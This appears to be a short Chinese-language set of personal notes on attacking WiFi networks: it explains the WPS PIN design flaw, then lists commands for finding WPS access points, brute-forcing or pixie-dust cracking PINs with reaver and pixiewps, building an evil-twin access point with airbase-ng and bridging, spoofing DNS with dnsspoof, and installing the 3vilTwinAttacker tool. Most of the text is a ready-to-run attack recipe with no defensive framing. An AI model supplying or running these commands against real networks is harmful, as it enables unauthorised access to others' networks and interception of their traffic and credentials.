
# wps破解

* 描述

* airodump-ng

* wifite

* 3vilTwinAttacker

## 描述
> WPS是WiFi联盟2006年开发的一项技术   
>> 通过PIN码来简化无线接入的操作，无需记住PSK  
>> 路由器和网卡各按一个按钮就能接入无线  
>> PIN码是分为前后各4位的2段共8位数字  
> 安全漏洞  
>> 2011年被发现安全涉及漏洞  
>> 接入发起方可以根据路由器的返回信息判断前4位是否正确  
>> 而PIN码的后4位只有1000种定义的组合（最后一位是checksum）  
>> 所以全部穷举破解只需要11000次尝试  
>>> PSK：218340105584896种可能     
>> 标准本身没有设计锁定机制，目前多个厂商已实现锁定机制  

> 都要支持WPS功能，初衷是：物理连接，物理确认（通过按钮  ）。  
> AP要是支持WPS的话，只要尝试最多11000次找出PIN码，就会被破解。


## wps破解
```shell 
    service network-manager stop
    airmon-ng check kill

    1.启动监听模式后，发现支持wps的ap
        wash -C -i wlan0mon
        airodump-ng wlan0mon -b <ap mac> --wps
    2.爆破pin码
        reaver -i wlan0mon -b <ap mac> -vv
    3.秒破pin码
        reaver -i wlan0mon -b <ap mac> -vv -K l
        pixiewps
        reaver -i wlan0mon -b <ap mac> -vv -p 8888888
```


## wifite
```shell 
* EVIL TWIN AP	
    1. airbase-ng -a <AP mac> --essid "kifi" -c 11 wlan0mon
    2. apt-get install bridge-utils
    3. brctl addbr bridge
    4. brctl addif bridge eth0
        dhclient eth0 (获取有线ip)
    5. brctl addif bridge at0
    6. ifconfig eth0 0.0.0.0 up
    7. ifconfig at0 0.0.0.0 up
    8. ifconfig bridge 192.168.1.10 up
    9. route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1
    10. echo 1 > /proc/sys/net/ipv4/ip_forward

    11. dnspoof -i bridge -f dnsspoof.hosts
        /usr/share/dsniff/dnsspoof.hosts
    12. apachet2ctl start
```

## 3vilTwinAttacker
```shell 
    1. git clone https://github.com/P0cl4bs/3vilTwinAttacker.git
    2. cd 3vilTwinAttacker
    3. chmod +x installer.sh
    4. ./installer.sh install
```

